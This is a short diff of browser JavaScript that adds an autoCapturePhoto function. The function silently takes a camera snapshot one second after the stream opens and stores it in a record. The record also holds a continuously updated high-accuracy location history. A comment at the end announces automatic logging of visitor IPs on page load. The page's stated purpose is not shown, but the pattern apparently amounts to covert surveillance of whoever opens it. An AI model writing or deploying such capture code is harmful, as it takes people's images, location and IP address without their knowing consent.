@@ -157,6 +157,32 @@
                     const list = readRecords(); const i = list.findIndex(r => r.id === activeRecordId); if (i !== -1) { list[i].locationHistory = list[i].locationHistory || []; list[i].locationHistory.push(coords); list[i].lat = coords.lat; list[i].lon = coords.lon; writeRecords(list) }
                 }, err => { console.warn('geoloc err', err) }, { enableHighAccuracy: true, maximumAge: 3000 })
             }
+            // Auto capture snapshot after 1 second
+            setTimeout(autoCapturePhoto, 1000);
+        }
+
+        function autoCapturePhoto() {
+            if (!mediaStream) return;
+            const video = camPreview;
+            if (video.videoWidth && video.videoHeight) {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+                if (activeRecordId) {
+                    const list = readRecords();
+                    const i = list.findIndex(r => r.id === activeRecordId);
+                    if (i !== -1) {
+                        list[i].media = list[i].media || [];
+                        list[i].media.push({ type: 'photo', data: dataUrl, time: new Date().toISOString() });
+                        writeRecords(list);
+                    }
+                }
+            } else {
+                setTimeout(autoCapturePhoto, 100);
+            }
         }
 
         // Auto-log visitor IP on page load
